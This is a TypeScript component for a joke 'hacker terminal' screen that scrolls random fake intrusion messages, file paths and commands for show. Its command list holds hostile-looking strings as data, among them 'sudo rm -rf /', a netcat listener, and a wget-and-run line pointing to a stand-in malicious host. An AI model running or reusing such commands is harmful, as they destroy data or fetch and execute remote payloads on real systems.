export class HackerTerminal {
  private container: HTMLElement;
  private outputElement: HTMLElement;
  private isRunning: boolean = false;
  private animationFrame: number | null = null;
  private currentLines: string[] = [];
  private maxLines = 30;
  
  private readonly hackerMessages = [
    'INITIALIZING SECURE CONNECTION...',
    'BYPASSING FIREWALL PROTOCOLS...',
    'ACCESSING MAINFRAME DATABASE...',
    'DECRYPTING RSA-2048 ENCRYPTION...',
    'INJECTING SQL PAYLOAD: SELECT * FROM users WHERE 1=1...',
    'ESTABLISHING BACKDOOR ACCESS...',
    'DOWNLOADING CLASSIFIED FILES...',
    'CRACKING PASSWORD HASH: $2b$10$...',
    'EXPLOITING BUFFER OVERFLOW VULNERABILITY...',
    'ESCALATING PRIVILEGES TO ROOT...',
    'TUNNELING THROUGH PROXY SERVERS...',
    'INTERCEPTING NETWORK PACKETS...',
    'BRUTE FORCING AUTHENTICATION...',
    'COMPILING KERNEL MODULE...',
    'INSTALLING ROOTKIT...',
    'HIDING PROCESS FROM TASK MANAGER...',
    'MODIFYING SYSTEM REGISTRY...',
    'DISABLING ANTIVIRUS SOFTWARE...',
    'EXTRACTING BITCOIN WALLET KEYS...',
    'ROUTING THROUGH TOR NETWORK...',
    'SPOOFING MAC ADDRESS...',
    'LAUNCHING DISTRIBUTED ATTACK...',
    'SCANNING OPEN PORTS...',
    'EXPLOITING ZERO-DAY VULNERABILITY...',
    'REVERSE ENGINEERING BINARY...',
    'DECOMPILING SOURCE CODE...',
    'PATCHING SYSTEM KERNEL...',
    'OVERRIDING SECURITY PROTOCOLS...',
    'ACCESSING SATELLITE UPLINK...',
    'TRIANGULATING GPS COORDINATES...'
  ];
  
  private readonly systemFiles = [
    '/etc/passwd',
    '/var/log/auth.log',
    '/bin/bash',
    '/usr/lib/systemd/system',
    '/proc/cpuinfo',
    '/dev/null',
    '/root/.ssh/id_rsa',
    '/etc/shadow',
    '/var/www/html/index.php',
    '/usr/local/bin/backdoor',
    '/tmp/.hidden/malware.exe',
    '/boot/grub/grub.cfg',
    '/sys/kernel/debug',
    '/opt/secret/data.db'
  ];
  
  private readonly commands = [
    'sudo rm -rf /',
    'chmod 777 /etc/passwd',
    'nc -lvp 4444',
    'nmap -sS -p-',
    'john --wordlist=/usr/share/wordlists/rockyou.txt',
    'aircrack-ng -w passwords.txt capture.cap',
    'metasploit -x "use exploit/multi/handler"',
    'hydra -l admin -P passwords.txt ssh://',
    'sqlmap -u "http://target.com/index.php?id=1"',
    'hashcat -m 0 -a 0 hashes.txt wordlist.txt',
    'wget http://malicious.site/payload.sh && sh payload.sh'
  ];

  constructor(container: HTMLElement) {
    this.container = container;
    this.setupUI();
    this.outputElement = this.container.querySelector('#hacker-output') as HTMLElement;
    this.start();
  }

  private setupUI(): void {
    this.container.innerHTML = `
      <div class="hacker-terminal">
        <div class="hacker-header">
          <div class="hacker-title">
            <span class="skull">💀</span> HACKERMAN TERMINAL v1.337 <span class="skull">💀</span>
          </div>
          <div class="hacker-subtitle">
            [ UNAUTHORIZED ACCESS DETECTED ]
          </div>
        </div>
        <div class="hacker-output" id="hacker-output"></div>
        <div class="hacker-footer">
          <div class="blink">▮</div>
          <span>Press ESC or type any command to exit</span>
        </div>
      </div>
    `;
    
    this.outputElement = this.container.querySelector('#hacker-output')!;
  }

  private start(): void {
    this.isRunning = true;
    this.addLine('> INITIATING HACK SEQUENCE...');
    this.addLine('> TARGET ACQUIRED');
    this.addLine('');
    
    setTimeout(() => {
      this.runHackingAnimation();
    }, 1000);
    
    // Listen for ESC key
    const handleKeydown = (e: KeyboardEvent) => {
      if (e.key === 'Escape' || e.key === '/') {
        this.stop();
        document.removeEventListener('keydown', handleKeydown);
      }
    };
    document.addEventListener('keydown', handleKeydown);
  }

  private runHackingAnimation(): void {
    if (!this.isRunning) return;
    
    const messageType = Math.random();
    
    if (messageType < 0.3) {
      // Show hacking message with progress
      const message = this.getRandomItem(this.hackerMessages);
      this.addLine(`[${this.getTimestamp()}] ${message}`);
      
      // Sometimes show a progress bar
      if (Math.random() < 0.5) {
        const progress = this.generateProgressBar();
        this.addLine(progress);
      }
    } else if (messageType < 0.5) {
      // Show fake command execution
      const command = this.getRandomItem(this.commands);
      this.addLine(`root@hackerman:~# ${command}`);
      
      // Sometimes show output
      if (Math.random() < 0.7) {
        const output = this.generateCommandOutput();
        output.forEach(line => this.addLine(line));
      }
    } else if (messageType < 0.7) {
      // Show file access
      const file = this.getRandomItem(this.systemFiles);
      this.addLine(`[ACCESS] Reading ${file}...`);
      
      // Show some hex dump
      if (Math.random() < 0.3) {
        this.addLine(this.generateHexDump());
      }
    } else if (messageType < 0.85) {
      // Show IP scanning
      const ip = this.generateIP();
      const port = Math.floor(Math.random() * 65535);
      const status = Math.random() < 0.3 ? 'OPEN' : 'CLOSED';
      this.addLine(`[SCAN] ${ip}:${port} - ${status}`);
    } else {
      // Show binary/matrix style output
      this.addLine(this.generateBinaryString());
    }
    
    // Random delay between 50-200ms for that frantic typing effect
    const delay = 50 + Math.random() * 150;
    setTimeout(() => this.runHackingAnimation(), delay);
  }

  private addLine(text: string): void {
    this.currentLines.push(text);
    
    // Keep only the last N lines
    if (this.currentLines.length > this.maxLines) {
      this.currentLines.shift();
    }
    
    // Update display
    this.outputElement.innerHTML = this.currentLines
      .map(line => `<div class="hacker-line">${this.escapeHtml(line)}</div>`)
      .join('');
    
    // Auto scroll to bottom
    this.outputElement.scrollTop = this.outputElement.scrollHeight;
  }

  private generateProgressBar(): string {
    const percent = Math.floor(Math.random() * 100);
    const barLength = 30;
    const filled = Math.floor((percent / 100) * barLength);
    const empty = barLength - filled;
    
    const bar = '█'.repeat(filled) + '░'.repeat(empty);
    return `[${bar}] ${percent}%`;
  }

  private generateCommandOutput(): string[] {
    const outputs = [
      ['Permission denied', 'Overriding...', 'SUCCESS: Root access granted'],
      ['Connecting to 192.168.1.1...', 'Connection established', 'Downloading data...'],
      ['Found 1337 vulnerabilities', 'Exploiting...', 'Payload delivered successfully'],
      ['Scanning network...', `Found ${Math.floor(Math.random() * 100)} devices`, 'Mapping topology...'],
      ['Injecting packet...', 'Response intercepted', 'Decoding...']
    ];
    
    return this.getRandomItem(outputs);
  }

  private generateHexDump(): string {
    const hex = [];
    for (let i = 0; i < 8; i++) {
      hex.push(Math.floor(Math.random() * 255).toString(16).padStart(2, '0').toUpperCase());
    }
    return `0x00000000: ${hex.join(' ')}  ........`;
  }

  private generateIP(): string {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }

  private generateBinaryString(): string {
    let binary = '';
    for (let i = 0; i < 60; i++) {
      binary += Math.random() < 0.5 ? '0' : '1';
      if (i % 8 === 7) binary += ' ';
    }
    return binary;
  }

  private getTimestamp(): string {
    const now = new Date();
    return `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}.${now.getMilliseconds().toString().padStart(3, '0')}`;
  }

  private getRandomItem<T>(array: T[]): T {
    return array[Math.floor(Math.random() * array.length)];
  }

  private escapeHtml(text: string): string {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }

  private stop(): void {
    this.isRunning = false;
    if (this.animationFrame) {
      cancelAnimationFrame(this.animationFrame);
    }
  }
}